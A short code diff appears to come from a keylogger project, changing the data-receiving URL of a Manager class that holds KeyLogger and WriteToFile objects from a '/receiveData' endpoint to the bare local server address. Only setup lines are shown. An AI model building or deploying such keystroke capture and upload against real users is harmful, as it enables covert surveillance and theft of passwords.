@@ -9,7 +9,7 @@ class Manager:
         self.recorde = KeyLogger()
         self.data = WriteToFile()
         self.running = True
-        self.url = "http://127.0.0.1:5000/receiveData"
+        self.url = "http://127.0.0.1:5000"
 
 
     def start_recording(self):
